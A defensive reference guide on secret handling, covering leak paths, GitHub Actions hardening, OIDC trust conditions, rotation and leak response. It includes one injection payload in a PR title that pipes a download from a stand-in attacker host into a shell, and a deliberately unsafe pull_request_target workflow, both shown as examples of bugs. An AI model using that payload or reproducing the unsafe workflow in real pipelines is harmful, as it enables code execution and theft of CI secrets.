# Secrets and CI/CD identity

Read this when a credential, signing key, token or certificate is created, logged, shipped to a client, used in CI, rotated, or has leaked.

## Where secrets leak in practice

Check each of these on any change that handles a credential:

- **URLs.** API keys or session tokens in query strings end up in proxy and CDN access logs, browser history, analytics and the `Referer` header sent to third-party scripts. Put them in headers or the body.
- **Logs and error trackers.** `logger.info({ req })`, `console.log(config)`, HTTP client debug logging, and error trackers capturing request headers and bodies by default. Redact by key at the logger (`authorization`, `cookie`, `set-cookie`, `password`, `token`, `secret`, `apiKey`), and turn off header and body capture in the tracker or scrub it in its before-send hook.
- **Error responses.** Driver errors include connection strings or query text; upstream errors include the upstream response body, sometimes with its own keys. Log the detail with a correlation id and return the id.
- **Client bundles.** Vite inlines every variable whose name starts with `VITE_` (or any prefix added to `envPrefix`) into the JavaScript served to every visitor. A server key under such a name is public. Also check for secrets imported into shared modules that frontend code imports, and for published source maps.
- **Container images.** `COPY . .` with a `.env` present, `ARG`/`ENV` holding tokens (visible in `docker history`), package manager credentials left in `.npmrc` in a layer. Use build secret mounts and a `.dockerignore`.
- **Infrastructure state.** Terraform state holds generated passwords and keys in plaintext; the state backend needs the same access control as the secrets themselves.
- **CI logs.** Masking matches the literal value only. Base64, URL-encoding, JSON-escaping or a substring of the secret prints in the clear.

## CI pipelines (GitHub Actions)

The full workflow review procedure (cache poisoning, `persist-credentials: false`, `secrets: inherit`, environments) is in infrastructure-ops `references/github-actions.md`.

**Untrusted code with privileged context.** `pull_request_target` and `workflow_run` run with the base repository's secrets and a write-capable `GITHUB_TOKEN`. GitHub's guidance is that such workflows must not check out untrusted code. The dangerous shape:

```yaml
on: pull_request_target
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: npm ci && npm test   # runs the fork's package.json scripts with secrets available
```

actions/checkout v7, and the v6.1.0, v5.1.0 and v4.4.0 backports, refuse this checkout unless `allow-unsafe-pr-checkout: true` is set, so on current versions that input is the marker to search for. A `git fetch origin pull/<n>/head` or `gh pr checkout` in a `run` step bypasses the guard and is the same bug.

Run untrusted PR code under `pull_request` with no secrets and read-only permissions. If a privileged step needs results from it (commenting, labeling), pass artifacts to a separate `workflow_run` job that treats them as data and never executes them.

**Expression injection.** `${{ }}` is substituted into the script text before the shell runs, so a PR title of `"; curl attacker.example/x | sh; "` executes.

```yaml
# Before
- run: echo "Building ${{ github.event.pull_request.title }}"

# After: GitHub's recommended pattern, the value arrives as data in an environment variable.
- env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "Building $PR_TITLE"
```

Attacker-controlled contexts include issue and PR titles and bodies, comment bodies, branch names (`head_ref`), commit messages and author names.

**Supply chain.** Pin third-party actions to a full commit SHA; GitHub documents this as the only way to use an action as an immutable release. Set `permissions:` at the top of each workflow to the minimum (often `contents: read`) and widen per job. Package installs in CI use the lockfile (`npm ci`, `pip install --require-hashes` where the project supports it). npm 12 and later skip dependency install scripts unless the package is listed in `allowScripts` in `package.json`, so an addition to that list, or `--dangerously-allow-all-scripts` in a workflow, lets third-party code run at install time and gets reviewed like code. The project's own lifecycle scripts still run, which is why `npm ci` on a fork's checkout executes the fork's code. Internal package names should be registered or scoped on the public registry to prevent dependency confusion.

**OIDC to the cloud.** Replace stored cloud keys with OIDC federation (`permissions: id-token: write` on the job that needs it). The cloud trust policy must constrain the subject; GitHub states you must define at least one condition so untrusted repositories cannot obtain tokens. For AWS:

```json
"Condition": {
  "StringEquals": {
    "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
    "token.actions.githubusercontent.com:sub": "repo:my-org/deploy-service:environment:production"
  }
}
```

Failure shapes: `StringLike` with `repo:my-org/*` (any repo in the org, including ones any member can create), `repo:my-org/app:*` (any branch and any `pull_request` run), or no `sub` condition at all. Bind production roles to a protected environment with required reviewers. Check the exact subject format your repository emits before writing the condition. Repositories created after July 15, 2026, repositories renamed or transferred after that date, and older ones that opted in use the immutable form `repo:OWNER@OWNER-ID/REPO@REPO-ID:...` (for example `repo:my-org@123456/deploy-service@456789:environment:production`); a condition written in the old form rejects every token from them, and the tempting fix of widening it to `StringLike` is the failure above.

## Secret ownership and rotation

For each secret, record owner, consumers, purpose, storage location, the identity allowed to read it, rotation interval and procedure, and how to verify the old version no longer works. Never record the value.

Rotation is an overlap protocol:

1. Issue a new version alongside the old one.
2. Deploy every consumer so it can use the new version; for inbound verification (webhook secrets, JWT keys), accept both.
3. Confirm through logs or metrics that traffic uses the new version.
4. Revoke the old version at the issuer, not only in the secret store.
5. Prove the old credential fails.

Database passwords and certificates need an extra check that connection pools and caches pick up the new value without a restart storm.

## When a secret has leaked

1. Revoke or rotate at the issuer first. Removing the commit, force-pushing or making the repo private does not un-expose a value that forks, clones, CI caches, search indexes and scrapers already have. Assume anything pushed to a public repository was harvested immediately.
2. Review the issuer's audit logs for use of the credential between exposure and revocation, and scope the incident from what it could reach.
3. Then clean up history and artifacts if policy requires it.
4. Find the path that let it leak (logger, bundle, image, CI step) and fix that, with a test or scanner rule that catches the recurrence.

Keep the incident record free of the secret itself.

## Scanning

Run secret scanning in pre-commit and in CI over the repository, build context and produced artifacts (images, bundles). Triage findings: a publishable Stripe key, a public key or a test fixture is not a leak; a live server key is, even in a test file. Keep allowlist entries reviewed and specific so they do not become a hiding place.
